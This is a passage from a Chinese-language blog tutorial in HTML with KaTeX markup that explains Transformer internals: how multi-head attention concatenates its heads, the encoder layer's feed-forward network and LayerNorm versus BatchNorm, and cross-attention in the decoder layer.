class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Z</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Z_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>的形状为<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>×</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(seq\_len, out\_size \times h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span></span>；</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/895e4b581ef6472b899ed7513ba4e699~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=nwj75KDtxlyYWT5GOzlbtjS8G7c%3D" alt="c11.jpg" width="100%" loading="lazy"/></p>
<p>当然，为了确保输入输出矩阵的特征/维度相同，在每个自注意层的输出时要把<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">out\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>设置为“<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>b</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mi mathvariant="normal">/</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">emb\_size/h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mord">/</span><span class="mord mathnormal">h</span></span></span></span></span>”</p>
<p>首先，还是再强调一下这个符号（圆圈内一竖）的意思，它就是合并操作(类似PyTorch中的 <code>torch.cat()</code> 或 NumPy 中的 <code>np.concatenate()</code>)，例如：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 假设有三个头，每个头输出维度为 out_size = 2</span>
Z_1 = [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>],  
         [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>],   
         [<span class="hljs-number">1</span>, <span class="hljs-number">9</span>]]   

Z_2 = [[<span class="hljs-number">5</span>, <span class="hljs-number">9</span>],
         [<span class="hljs-number">8</span>, <span class="hljs-number">7</span>],
         [<span class="hljs-number">1</span>, <span class="hljs-number">6</span>]]

Z_3 = [[<span class="hljs-number">3</span>, <span class="hljs-number">0</span>],
         [<span class="hljs-number">2</span>, <span class="hljs-number">2</span>],
         [<span class="hljs-number">4</span>, <span class="hljs-number">8</span>]]

<span class="hljs-comment"># 沿特征维度（dim=1）拼接</span>
Z_out =    [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>],  <span class="hljs-comment"># 位置1：融合了3个头的视角</span>
            [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>],  <span class="hljs-comment"># 位置2：融合了3个头的视角</span>
            [<span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>]]  <span class="hljs-comment"># 位置3：融合了3个头的视角</span>
</code></pre>
<p>这就是多头注意力了，是不是非常简单！我们就可以将上面的这个算法流程封装成Multi Head Attention模块。</p>
<p><strong>小提示：如果你给每个自注意力层的注意力权重<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span>加了掩码，那么封装成的多头注意力就叫做Masked Multi Head Attention。本质完全和Multi Head Attention一样，就是有无掩码的区别。</strong></p>
<hr/>
<p>接下来，让我们开始动手构建Transformer的编码器模块。与之前介绍的注意力模块一脉相承，<strong>编码器层的核心功能同样是将一个序列转换为另一个序列，并且保持输入与输出的维度一致</strong>。下图清晰地展示了一个标准Transformer编码器层（Transformer Encoder Layer）的内部结构，相信大家都能看懂。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b22f52a00419483ebd741452b65554fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=zAPZJj0MmYs8wkGEnRiFdzsFwmQ%3D" alt="c12.jpg" width="100%" loading="lazy"/></p>
<p>观察这个结构图，你会发现它主要由两大核心组件构成：</p>
<ol>
<li><strong>多头自注意力层（Multi-Head Self-Attention）</strong>：这就是我们上一节所构建的模块，负责让序列中的每个位置都能汇聚全局的上下文信息。</li>
<li><strong>前馈神经网络层（Feed-Forward Network, FFN）</strong>：一个应用于每个位置上的独立、全连接网络，负责对汇聚后的信息进行非线性变换和深层处理。</li>
</ol>
<p>这两个核心组件都被**残差连接（Residual Connection）<strong>和</strong>层归一化（Layer Normalization）**所包裹，形成了“子层 -&gt; 加残差 -&gt; 归一化”的稳定计算单元。</p>
<p>这里要注意一点，就是在线性层Linear那里，第一个线性层将输入向量的维度扩大到一个比较大的维度<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">large\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>，第二个线性层再将其压缩回原始的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">embed\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>。</p>
<p>你可能觉得很奇怪，为什么要这样做呢？其实在更高的维度空间中，模型能够学习到更复杂、更细微的特征组合模式。模型从“看山是山”的阶段，到“看山不是山”的阶段，最后又回到了“看山还是山”的阶段，虽然看似首尾相同，其实两个的境界已经不一样了。它已经实现了在更高层次上的回归与升华。</p>
<p>另外，还有一个需要注意的是这里的LayerNorm层，它和我们常见到的BatchNorm非常相似，都是归一化；二者目标相似（加速训练、稳定梯度），但作用维度截然不同。BatchNorm是对同一特征通道，跨不同样本进行归一化，而LayerNorm对单个样本，跨不同特征通道进行归一化。</p>
<p>假设我们有一个简单的数据，形状为 <code>(batch_size=3, embed_size=4)</code>：</p>
<pre><code class="hljs language-python" lang="python">X = [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>], 
     [<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>],  
     [<span class="hljs-number">9</span>, <span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>]] 
</code></pre>
<ul>
<li><strong>批归一化（BN）</strong> 的操作维度：对于<strong>第一个特征通道</strong>（即所有数据的第一个数字），它会收集 <code>X[0,0]=1</code>, <code>X[1,0]=5</code>, <code>X[2,0]=9</code>这3个值，计算它们的均值与方差，然后用这个统一的分布去归一化这3个值。它对每个特征通道独立进行此操作。</li>
<li><strong>层归一化（LN）</strong> 的操作维度：对于<strong>样本1的第一个位置</strong> <code>X[0] = [1,2,3,4]</code>，它会计算这个长度为4的向量自身的均值和方差，然后用这个均值和方差去归一化这个向量本身。它对每个样本的每个位置独立进行此操作。</li>
</ul>
<p>LayerNorm在这里的好处就是无论序列多长，归一化都在每个位置的向量内进行，因此天生适应变长序列。</p>
<hr/>
<p>再接下来，让我们开始构建 Transformer 的<strong>解码器模块</strong>。解码器的核心功能同样是<strong>将一个序列转换为另一个序列</strong>，但它与编码器有一个关键区别：解码器接收<strong>两个输入</strong>。下图展示了一个标准 Transformer 解码器层（Decoder Layer）的完整结构。相信大家都能看懂，就不做具体讲解了。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9cf15c665974a648bb03add1f84fb44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=Bs63OXk65noYGBow6AFtU0lJ8t4%3D" alt="c13.jpg" width="100%" loading="lazy"/></p>
<p>这里需要额外强调，原始输入矩阵<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>的形状和输出<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">S_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>的形状是完全相同的，只不过这个附加的输入<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>有点不一样，它的维度和<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>相同，但是序列长度可以不一样。相信你已经看出来了，这个<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>就是上一节我们讲的编码器的输出。</p>
<p>另外，我相信很多人在<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>这里很很多不解，我当时学习的时候就在这个地方卡了很久，不知道<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>是如何输入到多头注意力中的，我把这个部分的多头注意力模块进行了拆解，如下图所示</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12c35d3fabb34ef8a5b9e6a7a6997be5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=4QeV2q%2BTeRBenKpimycDgZgJwFA%3D" alt="c15.jpg" width="100%" loading="lazy"/></p>
<p>如图所示：</p>
<ul>
<li>查询矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span></span></span></span></span> 由解码器输入 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span> 经过线性变换得到：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>X</mi><msub><mi>W</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">Q = X W_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>。</li>
<li>键矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span> 和值矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span> 则由编码器输出 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 经过<strong>各自独立</strong>的线性变换得到：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>=</mo><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub><msub><mi>W</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">K = Y_{out} W_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>, <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>=</mo><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">V = Y_{out} W_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。</li>
</ul>
<p>此后的计算流程与标准自注意力完全相同。这样一来，解码器中的每个位置都能够根据自身的需要（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span></span></span></span></span>），有选择地从编码器输出的所有位置（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo separator="true">,</mo><mi>V</mi></mrow><annotation encoding="application/x-tex">K, V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span>）中汇聚信息。这个环节的学术名称就是“交叉注意力”。</p>
<p>最后，还有一个关键问题：就是为什么编码器的输出<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>的序列长度<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>e</mi><mi>w</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">new\_seq\_len</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">se</span><span class="mord mathnormal" 